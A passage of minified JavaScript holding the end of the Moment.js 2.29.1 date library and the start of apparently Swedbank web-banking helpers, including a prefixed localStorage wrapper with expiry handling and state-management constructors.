n=M(e)?e:Tt(e);return!(!this.isValid()||!n.isValid())&&("millisecond"===(t=V(t)||"millisecond")?this.valueOf()>n.valueOf():n.valueOf()<this.clone().startOf(t).valueOf())},pn.isBefore=function(e,t){var n=M(e)?e:Tt(e);return!(!this.isValid()||!n.isValid())&&("millisecond"===(t=V(t)||"millisecond")?this.valueOf()<n.valueOf():this.clone().endOf(t).valueOf()<n.valueOf())},pn.isBetween=function(e,t,n,s){var i=M(e)?e:Tt(e),r=M(t)?t:Tt(t);return!!(this.isValid()&&i.isValid()&&r.isValid())&&("("===(s=s||"()")[0]?this.isAfter(i,n):!this.isBefore(i,n))&&(")"===s[1]?this.isBefore(r,n):!this.isAfter(r,n))},pn.isSame=function(e,t){var n,s=M(e)?e:Tt(e);return!(!this.isValid()||!s.isValid())&&("millisecond"===(t=V(t)||"millisecond")?this.valueOf()===s.valueOf():(n=s.valueOf(),this.clone().startOf(t).valueOf()<=n&&n<=this.clone().endOf(t).valueOf()))},pn.isSameOrAfter=function(e,t){return this.isSame(e,t)||this.isAfter(e,t)},pn.isSameOrBefore=function(e,t){return this.isSame(e,t)||this.isBefore(e,t)},pn.isValid=function(){return g(this)},pn.lang=nn,pn.locale=tn,pn.localeData=sn,pn.max=Pt,pn.min=Nt,pn.parsingFlags=function(){return c({},y(this))},pn.set=function(e,t){if("object"==typeof e)for(var n=function(e){var t,n=[];for(t in e)m(e,t)&&n.push({unit:t,priority:E[t]});return n.sort((function(e,t){return e.priority-t.priority})),n}(e=G(e)),s=0;s<n.length;s++)this[n[s].unit](e[n[s].unit]);else if(O(this[e=V(e)]))return this[e](t);return this},pn.startOf=function(e){var t,n;if(void 0===(e=V(e))||"millisecond"===e||!this.isValid())return this;switch(n=this._isUTC?un:on,e){case"year":t=n(this.year(),0,1);break;case"quarter":t=n(this.year(),this.month()-this.month()%3,1);break;case"month":t=n(this.year(),this.month(),1);break;case"week":t=n(this.year(),this.month(),this.date()-this.weekday());break;case"isoWeek":t=n(this.year(),this.month(),this.date()-(this.isoWeekday()-1));break;case"day":case"date":t=n(this.year(),this.month(),this.date());break;case"hour":t=this._d.valueOf(),t-=an(t+(this._isUTC?0:6e4*this.utcOffset()),36e5);break;case"minute":t=this._d.valueOf(),t-=an(t,6e4);break;case"second":t=this._d.valueOf(),t-=an(t,1e3)}return this._d.setTime(t),f.updateOffset(this,!0),this},pn.subtract=Qt,pn.toArray=function(){var e=this;return[e.year(),e.month(),e.date(),e.hour(),e.minute(),e.second(),e.millisecond()]},pn.toObject=function(){var e=this;return{years:e.year(),months:e.month(),date:e.date(),hours:e.hours(),minutes:e.minutes(),seconds:e.seconds(),milliseconds:e.milliseconds()}},pn.toDate=function(){return new Date(this.valueOf())},pn.toISOString=function(e){if(!this.isValid())return null;var t=!0!==e,n=t?this.clone().utc():this;return n.year()<0||9999<n.year()?U(n,t?"YYYYYY-MM-DD[T]HH:mm:ss.SSS[Z]":"YYYYYY-MM-DD[T]HH:mm:ss.SSSZ"):O(Date.prototype.toISOString)?t?this.toDate().toISOString():new Date(this.valueOf()+60*this.utcOffset()*1e3).toISOString().replace("Z",U(n,"Z")):U(n,t?"YYYY-MM-DD[T]HH:mm:ss.SSS[Z]":"YYYY-MM-DD[T]HH:mm:ss.SSSZ")},pn.inspect=function(){if(!this.isValid())return"moment.invalid(/* "+this._i+" */)";var e,t,n,s="moment",i="";return this.isLocal()||(s=0===this.utcOffset()?"moment.utc":"moment.parseZone",i="Z"),e="["+s+'("]',t=0<=this.year()&&this.year()<=9999?"YYYY":"YYYYYY",n=i+'[")]',this.format(e+t+"-MM-DD[T]HH:mm:ss.SSS"+n)},"undefined"!=typeof Symbol&&null!=Symbol.for&&(pn[Symbol.for("nodejs.util.inspect.custom")]=function(){return"Moment<"+this.format()+">"}),pn.toJSON=function(){return this.isValid()?this.toISOString():null},pn.toString=function(){return this.clone().locale("en").format("ddd MMM DD YYYY HH:mm:ss [GMT]ZZ")},pn.unix=function(){return Math.floor(this.valueOf()/1e3)},pn.valueOf=function(){return this._d.valueOf()-6e4*(this._offset||0)},pn.creationData=function(){return{input:this._i,format:this._f,locale:this._locale,isUTC:this._isUTC,strict:this._strict}},pn.eraName=function(){for(var e,t=this.localeData().eras(),n=0,s=t.length;n<s;++n){if(e=this.clone().startOf("day").valueOf(),t[n].since<=e&&e<=t[n].until)return t[n].name;if(t[n].until<=e&&e<=t[n].since)return t[n].name}return""},pn.eraNarrow=function(){for(var e,t=this.localeData().eras(),n=0,s=t.length;n<s;++n){if(e=this.clone().startOf("day").valueOf(),t[n].since<=e&&e<=t[n].until)return t[n].narrow;if(t[n].until<=e&&e<=t[n].since)return t[n].narrow}return""},pn.eraAbbr=function(){for(var e,t=this.localeData().eras(),n=0,s=t.length;n<s;++n){if(e=this.clone().startOf("day").valueOf(),t[n].since<=e&&e<=t[n].until)return t[n].abbr;if(t[n].until<=e&&e<=t[n].since)return t[n].abbr}return""},pn.eraYear=function(){for(var e,t,n=this.localeData().eras(),s=0,i=n.length;s<i;++s)if(e=n[s].since<=n[s].until?1:-1,t=this.clone().startOf("day").valueOf(),n[s].since<=t&&t<=n[s].until||n[s].until<=t&&t<=n[s].since)return(this.year()-f(n[s].since).year())*e+n[s].offset;return this.year()},pn.year=Le,pn.isLeapYear=function(){return j(this.year())},pn.weekYear=function(e){return cn.call(this,e,this.week(),this.weekday(),this.localeData()._week.dow,this.localeData()._week.doy)},pn.isoWeekYear=function(e){return cn.call(this,e,this.isoWeek(),this.isoWeekday(),1,4)},pn.quarter=pn.quarters=function(e){return null==e?Math.ceil((this.month()+1)/3):this.month(3*(e-1)+this.month()%3)},pn.month=Ue,pn.daysInMonth=function(){return xe(this.year(),this.month())},pn.week=pn.weeks=function(e){var t=this.localeData().week(this);return null==e?t:this.add(7*(e-t),"d")},pn.isoWeek=pn.isoWeeks=function(e){var t=Ae(this,1,4).week;return null==e?t:this.add(7*(e-t),"d")},pn.weeksInYear=function(){var e=this.localeData()._week;return je(this.year(),e.dow,e.doy)},pn.weeksInWeekYear=function(){var e=this.localeData()._week;return je(this.weekYear(),e.dow,e.doy)},pn.isoWeeksInYear=function(){return je(this.year(),1,4)},pn.isoWeeksInISOWeekYear=function(){return je(this.isoWeekYear(),1,4)},pn.date=fn,pn.day=pn.days=function(e){if(!this.isValid())return null!=e?this:NaN;var t,n,s=this._isUTC?this._d.getUTCDay():this._d.getDay();return null!=e?(t=e,n=this.localeData(),e="string"!=typeof t?t:isNaN(t)?"number"==typeof(t=n.weekdaysParse(t))?t:null:parseInt(t,10),this.add(e-s,"d")):s},pn.weekday=function(e){if(!this.isValid())return null!=e?this:NaN;var t=(this.day()+7-this.localeData()._week.dow)%7;return null==e?t:this.add(e-t,"d")},pn.isoWeekday=function(e){if(!this.isValid())return null!=e?this:NaN;if(null==e)return this.day()||7;var t,n,s=(t=e,n=this.localeData(),"string"==typeof t?n.weekdaysParse(t)%7||7:isNaN(t)?null:t);return this.day(this.day()%7?s:s-7)},pn.dayOfYear=function(e){var t=Math.round((this.clone().startOf("day")-this.clone().startOf("year"))/864e5)+1;return null==e?t:this.add(e-t,"d")},pn.hour=pn.hours=tt,pn.minute=pn.minutes=mn,pn.second=pn.seconds=gn,pn.millisecond=pn.milliseconds=yn,pn.utcOffset=function(e,t,n){var s,i=this._offset||0;if(!this.isValid())return null!=e?this:NaN;if(null==e)return this._isUTC?i:Et(this);if("string"==typeof e){if(null===(e=Vt(he,e)))return this}else Math.abs(e)<16&&!n&&(e*=60);return!this._isUTC&&t&&(s=Et(this)),this._offset=e,this._isUTC=!0,null!=s&&this.add(s,"m"),i!==e&&(!t||this._changeInProgress?Bt(this,Zt(e-i,"m"),1,!1):this._changeInProgress||(this._changeInProgress=!0,f.updateOffset(this,!0),this._changeInProgress=null)),this},pn.utc=function(e){return this.utcOffset(0,e)},pn.local=function(e){return this._isUTC&&(this.utcOffset(0,e),this._isUTC=!1,e&&this.subtract(Et(this),"m")),this},pn.parseZone=function(){var e;return null!=this._tzm?this.utcOffset(this._tzm,!1,!0):"string"==typeof this._i&&(null!=(e=Vt(le,this._i))?this.utcOffset(e):this.utcOffset(0,!0)),this},pn.hasAlignedHourOffset=function(e){return!!this.isValid()&&(e=e?Tt(e).utcOffset():0,(this.utcOffset()-e)%60==0)},pn.isDST=function(){return this.utcOffset()>this.clone().month(0).utcOffset()||this.utcOffset()>this.clone().month(5).utcOffset()},pn.isLocal=function(){return!!this.isValid()&&!this._isUTC},pn.isUtcOffset=function(){return!!this.isValid()&&this._isUTC},pn.isUtc=At,pn.isUTC=At,pn.zoneAbbr=function(){return this._isUTC?"UTC":""},pn.zoneName=function(){return this._isUTC?"Coordinated Universal Time":""},pn.dates=n("dates accessor is deprecated. Use date instead.",fn),pn.months=n("months accessor is deprecated. Use month instead",Ue),pn.years=n("years accessor is deprecated. Use year instead",Le),pn.zone=n("moment().zone is deprecated, use moment().utcOffset instead. http://momentjs.com/guides/#/warnings/zone/",(function(e,t){return null!=e?("string"!=typeof e&&(e=-e),this.utcOffset(e,t),this):-this.utcOffset()})),pn.isDSTShifted=n("isDSTShifted is deprecated. See http://momentjs.com/guides/#/warnings/dst-shifted/ for more information",(function(){if(!r(this._isDSTShifted))return this._isDSTShifted;var e,t={};return v(t,this),(t=bt(t))._a?(e=(t._isUTC?_:Tt)(t._a),this._isDSTShifted=this.isValid()&&0<function(e,t,n){for(var s=Math.min(e.length,t.length),i=Math.abs(e.length-t.length),r=0,a=0;a<s;a++)Z(e[a])!==Z(t[a])&&r++;return r+i}(t._a,e.toArray())):this._isDSTShifted=!1,this._isDSTShifted}));var kn=x.prototype;function Mn(e,t,n,s){var i=dt(),r=_().set(s,t);return i[n](r,e)}function Dn(e,t,n){if(h(e)&&(t=e,e=void 0),e=e||"",null!=t)return Mn(e,t,n,"month");for(var s=[],i=0;i<12;i++)s[i]=Mn(e,i,n,"month");return s}function Sn(e,t,n,s){"boolean"==typeof e?h(t)&&(n=t,t=void 0):(t=e,e=!1,h(n=t)&&(n=t,t=void 0)),t=t||"";var i,r=dt(),a=e?r._week.dow:0,o=[];if(null!=n)return Mn(t,(n+a)%7,s,"day");for(i=0;i<7;i++)o[i]=Mn(t,(i+a)%7,s,"day");return o}kn.calendar=function(e,t,n){var s=this._calendar[e]||this._calendar.sameElse;return O(s)?s.call(t,n):s},kn.longDateFormat=function(e){var t=this._longDateFormat[e],n=this._longDateFormat[e.toUpperCase()];return t||!n?t:(this._longDateFormat[e]=n.match(N).map((function(e){return"MMMM"===e||"MM"===e||"DD"===e||"dddd"===e?e.slice(1):e})).join(""),this._longDateFormat[e])},kn.invalidDate=function(){return this._invalidDate},kn.ordinal=function(e){return this._ordinal.replace("%d",e)},kn.preparse=vn,kn.postformat=vn,kn.relativeTime=function(e,t,n,s){var i=this._relativeTime[n];return O(i)?i(e,t,n,s):i.replace(/%d/i,e)},kn.pastFuture=function(e,t){var n=this._relativeTime[0<e?"future":"past"];return O(n)?n(t):n.replace(/%s/i,t)},kn.set=function(e){var t,n;for(n in e)m(e,n)&&(O(t=e[n])?this[n]=t:this["_"+n]=t);this._config=e,this._dayOfMonthOrdinalParseLenient=new RegExp((this._dayOfMonthOrdinalParse.source||this._ordinalParse.source)+"|"+/\d{1,2}/.source)},kn.eras=function(e,t){for(var n,s=this._eras||dt("en")._eras,i=0,r=s.length;i<r;++i){if("string"==typeof s[i].since)n=f(s[i].since).startOf("day"),s[i].since=n.valueOf();switch(typeof s[i].until){case"undefined":s[i].until=1/0;break;case"string":n=f(s[i].until).startOf("day").valueOf(),s[i].until=n.valueOf()}}return s},kn.erasParse=function(e,t,n){var s,i,r,a,o,u=this.eras();for(e=e.toUpperCase(),s=0,i=u.length;s<i;++s)if(r=u[s].name.toUpperCase(),a=u[s].abbr.toUpperCase(),o=u[s].narrow.toUpperCase(),n)switch(t){case"N":case"NN":case"NNN":if(a===e)return u[s];break;case"NNNN":if(r===e)return u[s];break;case"NNNNN":if(o===e)return u[s]}else if(0<=[r,a,o].indexOf(e))return u[s]},kn.erasConvertYear=function(e,t){var n=e.since<=e.until?1:-1;return void 0===t?f(e.since).year():f(e.since).year()+(t-e.offset)*n},kn.erasAbbrRegex=function(e){return m(this,"_erasAbbrRegex")||hn.call(this),e?this._erasAbbrRegex:this._erasRegex},kn.erasNameRegex=function(e){return m(this,"_erasNameRegex")||hn.call(this),e?this._erasNameRegex:this._erasRegex},kn.erasNarrowRegex=function(e){return m(this,"_erasNarrowRegex")||hn.call(this),e?this._erasNarrowRegex:this._erasRegex},kn.months=function(e,t){return e?o(this._months)?this._months[e.month()]:this._months[(this._months.isFormat||Pe).test(t)?"format":"standalone"][e.month()]:o(this._months)?this._months:this._months.standalone},kn.monthsShort=function(e,t){return e?o(this._monthsShort)?this._monthsShort[e.month()]:this._monthsShort[Pe.test(t)?"format":"standalone"][e.month()]:o(this._monthsShort)?this._monthsShort:this._monthsShort.standalone},kn.monthsParse=function(e,t,n){var s,i,r;if(this._monthsParseExact)return function(e,t,n){var s,i,r,a=e.toLocaleLowerCase();if(!this._monthsParse)for(this._monthsParse=[],this._longMonthsParse=[],this._shortMonthsParse=[],s=0;s<12;++s)r=_([2e3,s]),this._shortMonthsParse[s]=this.monthsShort(r,"").toLocaleLowerCase(),this._longMonthsParse[s]=this.months(r,"").toLocaleLowerCase();return n?"MMM"===t?-1!==(i=we.call(this._shortMonthsParse,a))?i:null:-1!==(i=we.call(this._longMonthsParse,a))?i:null:"MMM"===t?-1!==(i=we.call(this._shortMonthsParse,a))||-1!==(i=we.call(this._longMonthsParse,a))?i:null:-1!==(i=we.call(this._longMonthsParse,a))||-1!==(i=we.call(this._shortMonthsParse,a))?i:null}.call(this,e,t,n);for(this._monthsParse||(this._monthsParse=[],this._longMonthsParse=[],this._shortMonthsParse=[]),s=0;s<12;s++){if(i=_([2e3,s]),n&&!this._longMonthsParse[s]&&(this._longMonthsParse[s]=new RegExp("^"+this.months(i,"").replace(".","")+"$","i"),this._shortMonthsParse[s]=new RegExp("^"+this.monthsShort(i,"").replace(".","")+"$","i")),n||this._monthsParse[s]||(r="^"+this.months(i,"")+"|^"+this.monthsShort(i,""),this._monthsParse[s]=new RegExp(r.replace(".",""),"i")),n&&"MMMM"===t&&this._longMonthsParse[s].test(e))return s;if(n&&"MMM"===t&&this._shortMonthsParse[s].test(e))return s;if(!n&&this._monthsParse[s].test(e))return s}},kn.monthsRegex=function(e){return this._monthsParseExact?(m(this,"_monthsRegex")||He.call(this),e?this._monthsStrictRegex:this._monthsRegex):(m(this,"_monthsRegex")||(this._monthsRegex=We),this._monthsStrictRegex&&e?this._monthsStrictRegex:this._monthsRegex)},kn.monthsShortRegex=function(e){return this._monthsParseExact?(m(this,"_monthsRegex")||He.call(this),e?this._monthsShortStrictRegex:this._monthsShortRegex):(m(this,"_monthsShortRegex")||(this._monthsShortRegex=Re),this._monthsShortStrictRegex&&e?this._monthsShortStrictRegex:this._monthsShortRegex)},kn.week=function(e){return Ae(e,this._week.dow,this._week.doy).week},kn.firstDayOfYear=function(){return this._week.doy},kn.firstDayOfWeek=function(){return this._week.dow},kn.weekdays=function(e,t){var n=o(this._weekdays)?this._weekdays:this._weekdays[e&&!0!==e&&this._weekdays.isFormat.test(t)?"format":"standalone"];return!0===e?Ie(n,this._week.dow):e?n[e.day()]:n},kn.weekdaysMin=function(e){return!0===e?Ie(this._weekdaysMin,this._week.dow):e?this._weekdaysMin[e.day()]:this._weekdaysMin},kn.weekdaysShort=function(e){return!0===e?Ie(this._weekdaysShort,this._week.dow):e?this._weekdaysShort[e.day()]:this._weekdaysShort},kn.weekdaysParse=function(e,t,n){var s,i,r;if(this._weekdaysParseExact)return function(e,t,n){var s,i,r,a=e.toLocaleLowerCase();if(!this._weekdaysParse)for(this._weekdaysParse=[],this._shortWeekdaysParse=[],this._minWeekdaysParse=[],s=0;s<7;++s)r=_([2e3,1]).day(s),this._minWeekdaysParse[s]=this.weekdaysMin(r,"").toLocaleLowerCase(),this._shortWeekdaysParse[s]=this.weekdaysShort(r,"").toLocaleLowerCase(),this._weekdaysParse[s]=this.weekdays(r,"").toLocaleLowerCase();return n?"dddd"===t?-1!==(i=we.call(this._weekdaysParse,a))?i:null:"ddd"===t?-1!==(i=we.call(this._shortWeekdaysParse,a))?i:null:-1!==(i=we.call(this._minWeekdaysParse,a))?i:null:"dddd"===t?-1!==(i=we.call(this._weekdaysParse,a))||-1!==(i=we.call(this._shortWeekdaysParse,a))||-1!==(i=we.call(this._minWeekdaysParse,a))?i:null:"ddd"===t?-1!==(i=we.call(this._shortWeekdaysParse,a))||-1!==(i=we.call(this._weekdaysParse,a))||-1!==(i=we.call(this._minWeekdaysParse,a))?i:null:-1!==(i=we.call(this._minWeekdaysParse,a))||-1!==(i=we.call(this._weekdaysParse,a))||-1!==(i=we.call(this._shortWeekdaysParse,a))?i:null}.call(this,e,t,n);for(this._weekdaysParse||(this._weekdaysParse=[],this._minWeekdaysParse=[],this._shortWeekdaysParse=[],this._fullWeekdaysParse=[]),s=0;s<7;s++){if(i=_([2e3,1]).day(s),n&&!this._fullWeekdaysParse[s]&&(this._fullWeekdaysParse[s]=new RegExp("^"+this.weekdays(i,"").replace(".","\\.?")+"$","i"),this._shortWeekdaysParse[s]=new RegExp("^"+this.weekdaysShort(i,"").replace(".","\\.?")+"$","i"),this._minWeekdaysParse[s]=new RegExp("^"+this.weekdaysMin(i,"").replace(".","\\.?")+"$","i")),this._weekdaysParse[s]||(r="^"+this.weekdays(i,"")+"|^"+this.weekdaysShort(i,"")+"|^"+this.weekdaysMin(i,""),this._weekdaysParse[s]=new RegExp(r.replace(".",""),"i")),n&&"dddd"===t&&this._fullWeekdaysParse[s].test(e))return s;if(n&&"ddd"===t&&this._shortWeekdaysParse[s].test(e))return s;if(n&&"dd"===t&&this._minWeekdaysParse[s].test(e))return s;if(!n&&this._weekdaysParse[s].test(e))return s}},kn.weekdaysRegex=function(e){return this._weekdaysParseExact?(m(this,"_weekdaysRegex")||Qe.call(this),e?this._weekdaysStrictRegex:this._weekdaysRegex):(m(this,"_weekdaysRegex")||(this._weekdaysRegex=qe),this._weekdaysStrictRegex&&e?this._weekdaysStrictRegex:this._weekdaysRegex)},kn.weekdaysShortRegex=function(e){return this._weekdaysParseExact?(m(this,"_weekdaysRegex")||Qe.call(this),e?this._weekdaysShortStrictRegex:this._weekdaysShortRegex):(m(this,"_weekdaysShortRegex")||(this._weekdaysShortRegex=Be),this._weekdaysShortStrictRegex&&e?this._weekdaysShortStrictRegex:this._weekdaysShortRegex)},kn.weekdaysMinRegex=function(e){return this._weekdaysParseExact?(m(this,"_weekdaysRegex")||Qe.call(this),e?this._weekdaysMinStrictRegex:this._weekdaysMinRegex):(m(this,"_weekdaysMinRegex")||(this._weekdaysMinRegex=Je),this._weekdaysMinStrictRegex&&e?this._weekdaysMinStrictRegex:this._weekdaysMinRegex)},kn.isPM=function(e){return"p"===(e+"").toLowerCase().charAt(0)},kn.meridiem=function(e,t,n){return 11<e?n?"pm":"PM":n?"am":"AM"},lt("en",{eras:[{since:"0001-01-01",until:1/0,offset:1,name:"Anno Domini",narrow:"AD",abbr:"AD"},{since:"0000-12-31",until:-1/0,offset:1,name:"Before Christ",narrow:"BC",abbr:"BC"}],dayOfMonthOrdinalParse:/\d{1,2}(th|st|nd|rd)/,ordinal:function(e){var t=e%10;return e+(1===Z(e%100/10)?"th":1==t?"st":2==t?"nd":3==t?"rd":"th")}}),f.lang=n("moment.lang is deprecated. Use moment.locale instead.",lt),f.langData=n("moment.langData is deprecated. Use moment.localeData instead.",dt);var Yn=Math.abs;function On(e,t,n,s){var i=Zt(t,n);return e._milliseconds+=s*i._milliseconds,e._days+=s*i._days,e._months+=s*i._months,e._bubble()}function bn(e){return e<0?Math.floor(e):Math.ceil(e)}function xn(e){return 4800*e/146097}function Tn(e){return 146097*e/4800}function Nn(e){return function(){return this.as(e)}}var Pn=Nn("ms"),Rn=Nn("s"),Wn=Nn("m"),Cn=Nn("h"),Un=Nn("d"),Hn=Nn("w"),Fn=Nn("M"),Ln=Nn("Q"),Vn=Nn("y");function Gn(e){return function(){return this.isValid()?this._data[e]:NaN}}var En=Gn("milliseconds"),An=Gn("seconds"),jn=Gn("minutes"),In=Gn("hours"),Zn=Gn("days"),zn=Gn("months"),$n=Gn("years"),qn=Math.round,Bn={ss:44,s:45,m:45,h:22,d:26,w:null,M:11};var Qn=Math.abs;function Xn(e){return(0<e)-(e<0)||+e}function Kn(){if(!this.isValid())return this.localeData().invalidDate();var e,t,n,s,i,r,a,o,u=Qn(this._milliseconds)/1e3,l=Qn(this._days),h=Qn(this._months),d=this.asSeconds();return d?(e=I(u/60),t=I(e/60),u%=60,e%=60,n=I(h/12),h%=12,s=u?u.toFixed(3).replace(/\.?0+$/,""):"",i=d<0?"-":"",r=Xn(this._months)!==Xn(d)?"-":"",a=Xn(this._days)!==Xn(d)?"-":"",o=Xn(this._milliseconds)!==Xn(d)?"-":"",i+"P"+(n?r+n+"Y":"")+(h?r+h+"M":"")+(l?a+l+"D":"")+(t||e||u?"T":"")+(t?o+t+"H":"")+(e?o+e+"M":"")+(u?o+s+"S":"")):"P0D"}var es=Ct.prototype;return es.isValid=function(){return this._isValid},es.abs=function(){var e=this._data;return this._milliseconds=Yn(this._milliseconds),this._days=Yn(this._days),this._months=Yn(this._months),e.milliseconds=Yn(e.milliseconds),e.seconds=Yn(e.seconds),e.minutes=Yn(e.minutes),e.hours=Yn(e.hours),e.months=Yn(e.months),e.years=Yn(e.years),this},es.add=function(e,t){return On(this,e,t,1)},es.subtract=function(e,t){return On(this,e,t,-1)},es.as=function(e){if(!this.isValid())return NaN;var t,n,s=this._milliseconds;if("month"===(e=V(e))||"quarter"===e||"year"===e)switch(t=this._days+s/864e5,n=this._months+xn(t),e){case"month":return n;case"quarter":return n/3;case"year":return n/12}else switch(t=this._days+Math.round(Tn(this._months)),e){case"week":return t/7+s/6048e5;case"day":return t+s/864e5;case"hour":return 24*t+s/36e5;case"minute":return 1440*t+s/6e4;case"second":return 86400*t+s/1e3;case"millisecond":return Math.floor(864e5*t)+s;default:throw new Error("Unknown unit "+e)}},es.asMilliseconds=Pn,es.asSeconds=Rn,es.asMinutes=Wn,es.asHours=Cn,es.asDays=Un,es.asWeeks=Hn,es.asMonths=Fn,es.asQuarters=Ln,es.asYears=Vn,es.valueOf=function(){return this.isValid()?this._milliseconds+864e5*this._days+this._months%12*2592e6+31536e6*Z(this._months/12):NaN},es._bubble=function(){var e,t,n,s,i,r=this._milliseconds,a=this._days,o=this._months,u=this._data;return 0<=r&&0<=a&&0<=o||r<=0&&a<=0&&o<=0||(r+=864e5*bn(Tn(o)+a),o=a=0),u.milliseconds=r%1e3,e=I(r/1e3),u.seconds=e%60,t=I(e/60),u.minutes=t%60,n=I(t/60),u.hours=n%24,a+=I(n/24),o+=i=I(xn(a)),a-=bn(Tn(i)),s=I(o/12),o%=12,u.days=a,u.months=o,u.years=s,this},es.clone=function(){return Zt(this)},es.get=function(e){return e=V(e),this.isValid()?this[e+"s"]():NaN},es.milliseconds=En,es.seconds=An,es.minutes=jn,es.hours=In,es.days=Zn,es.weeks=function(){return I(this.days()/7)},es.months=zn,es.years=$n,es.humanize=function(e,t){if(!this.isValid())return this.localeData().invalidDate();var n,s,i=!1,r=Bn;return"object"==typeof e&&(t=e,e=!1),"boolean"==typeof e&&(i=e),"object"==typeof t&&(r=Object.assign({},Bn,t),null!=t.s&&null==t.ss&&(r.ss=t.s-1)),s=function Jn(e,t,n,s){var i=Zt(e).abs(),r=qn(i.as("s")),a=qn(i.as("m")),o=qn(i.as("h")),u=qn(i.as("d")),l=qn(i.as("M")),h=qn(i.as("w")),d=qn(i.as("y")),c=(r<=n.ss?["s",r]:r<n.s&&["ss",r])||a<=1&&["m"]||a<n.m&&["mm",a]||o<=1&&["h"]||o<n.h&&["hh",o]||u<=1&&["d"]||u<n.d&&["dd",u];return null!=n.w&&(c=c||h<=1&&["w"]||h<n.w&&["ww",h]),(c=c||l<=1&&["M"]||l<n.M&&["MM",l]||d<=1&&["y"]||["yy",d])[2]=t,c[3]=0<+e,c[4]=s,function(e,t,n,s,i){return i.relativeTime(t||1,!!n,e,s)}.apply(null,c)}(this,!i,r,n=this.localeData()),i&&(s=n.pastFuture(+this,s)),n.postformat(s)},es.toISOString=Kn,es.toString=Kn,es.toJSON=Kn,es.locale=tn,es.localeData=sn,es.toIsoString=n("toIsoString() is deprecated. Please use toISOString() instead (notice the capitals)",Kn),es.lang=nn,C("X",0,0,"unix"),C("x",0,0,"valueOf"),ce("x",ue),ce("X",/[+-]?\d+(\.\d{1,3})?/),ye("X",(function(e,t,n){n._d=new Date(1e3*parseFloat(e))})),ye("x",(function(e,t,n){n._d=new Date(Z(e))})),f.version="2.29.1",e=Tt,f.fn=pn,f.min=function(){return Rt("isBefore",[].slice.call(arguments,0))},f.max=function(){return Rt("isAfter",[].slice.call(arguments,0))},f.now=function(){return Date.now?Date.now():+new Date},f.utc=_,f.unix=function(e){return Tt(1e3*e)},f.months=function(e,t){return Dn(e,t,"months")},f.isDate=a,f.locale=lt,f.invalid=w,f.duration=Zt,f.isMoment=M,f.weekdays=function(e,t,n){return Sn(e,t,n,"weekdays")},f.parseZone=function(){return Tt.apply(null,arguments).parseZone()},f.localeData=dt,f.isDuration=Ut,f.monthsShort=function(e,t){return Dn(e,t,"monthsShort")},f.weekdaysMin=function(e,t,n){return Sn(e,t,n,"weekdaysMin")},f.defineLocale=ht,f.updateLocale=function(e,t){var n,s,i;return null!=t?(i=st,null!=it[e]&&null!=it[e].parentLocale?it[e].set(b(it[e]._config,t)):(null!=(s=ut(e))&&(i=s._config),t=b(i,t),null==s&&(t.abbr=e),(n=new x(t)).parentLocale=it[e],it[e]=n),lt(e)):null!=it[e]&&(null!=it[e].parentLocale?(it[e]=it[e].parentLocale,e===lt()&&lt(e)):null!=it[e]&&delete it[e]),it[e]},f.locales=function(){return s(it)},f.weekdaysShort=function(e,t,n){return Sn(e,t,n,"weekdaysShort")},f.normalizeUnits=V,f.relativeTimeRounding=function(e){return void 0===e?qn:"function"==typeof e&&(qn=e,!0)},f.relativeTimeThreshold=function(e,t){return void 0!==Bn[e]&&(void 0===t?Bn[e]:(Bn[e]=t,"s"===e&&(Bn.ss=t-1),!0))},f.calendarFormat=function(e,t){var n=e.diff(t,"days",!0);return n<-6?"sameElse":n<-1?"lastWeek":n<0?"lastDay":n<1?"sameDay":n<2?"nextDay":n<7?"nextWeek":"sameElse"},f.prototype=pn,f.HTML5_FMT={DATETIME_LOCAL:"YYYY-MM-DDTHH:mm",DATETIME_LOCAL_SECONDS:"YYYY-MM-DDTHH:mm:ss",DATETIME_LOCAL_MS:"YYYY-MM-DDTHH:mm:ss.SSS",DATE:"YYYY-MM-DD",TIME:"HH:mm",TIME_SECONDS:"HH:mm:ss",TIME_MS:"HH:mm:ss.SSS",WEEK:"GGGG-[W]WW",MONTH:"YYYY-MM"},f}));var CustomStorage=function(){function CustomStorage(prefix,driver){if(prefix){try{this.driver=window[driver||"localStorage"]}catch(ex){this.driver=null}this.prefix=prefix,this.driver||(Swedbank.warn(["CustomStorage:",driver+" not supported by the browser, using object based storage.","Or "+driver+" is blocked by third-party cookies policy.","NB! Note that this does not store data in-between page loads."].join(" ")),this.driver={cache:{},setItem:function(key,value){this.cache[key]=value},getItem:function(key){return this.cache[key]},removeItem:function(key){delete this.cache[key]}})}else Swedbank.error("CustomStorage: prefix not set.")}return CustomStorage.GLOBAL_STORAGE_PREFIX="SwdIb",CustomStorage.prototype.set=function(key,value,options){options=Object.assign({},{expiresIn:!1,merge:!1},options);var storageItem={data:value},objTmp=this.get(key);options.merge&&SharedComponents.helpers.isPlainObject(objTmp)&&(storageItem.data=Object.assign({},this.get(key)||{},value)),"string"==typeof options.expiresIn&&(storageItem.expiresAt=this.calculateExpirationTimestamp(options.expiresIn)),this.driver.setItem(this.prefixKey(key),JSON.stringify(storageItem))},CustomStorage.prototype.merge=function(key,obj){this.set(key,obj,{merge:!0})},CustomStorage.prototype.get=function(key,options){if(options=Object.assign({},{erase:!1},options),!this.keyExists(key))return null;var storageItem=JSON.parse(this.driver.getItem(this.prefixKey(key)));return this.isExpired(storageItem)?(this.erase(key),null):(options.erase&&this.erase(key),storageItem&&storageItem.data)},CustomStorage.prototype.erase=function(key){this.driver.removeItem(this.prefixKey(key))},CustomStorage.prototype.executeOnKey=function(key,callback,options){var value=this.get(key);options=Object.assign({},{erase:!1},options),value&&"function"==typeof callback&&callback(value),options.erase&&this.erase(key)},CustomStorage.prototype.prefixKey=function(key){return this.prefix+":"+key},CustomStorage.prototype.keyExists=function(key){return!!this.driver.getItem(this.prefixKey(key))},CustomStorage.prototype.calculateExpirationTimestamp=function(expiresIn){var today=Swedbank.Time.now.clone(),amount=expiresIn.split(" ")[0],timeUnit=expiresIn.split(" ")[1];return+today.add(timeUnit,amount).toDate()},CustomStorage.prototype.isExpired=function(storageItem){return!!storageItem&&storageItem.expiresAt<+Swedbank.Time.now},CustomStorage}();function State(initialValue){return this.value=initialValue,this.callbacks={before:{},after:{}},State.EVENTS.forEach((function(eventName){this.callbacks.before[eventName]=[],this.callbacks.after[eventName]=[]}),this),this.createShortcutFunction()}function ComputedState(dependencies,computeLogic){return this.dependencies=[],this.callbacks={after:{}},ComputedState.EVENTS.forEach((function(eventName){this.callbacks.after[eventName]=[]}),this),dependencies&&this.setDependencies(dependencies),computeLogic&&this.setComputeLogic(computeLogic),this.createShortcutFunction()}function ValueState(target){var state=new State;return state.bindValueToElement(target),state}Swedbank.localStorage=new 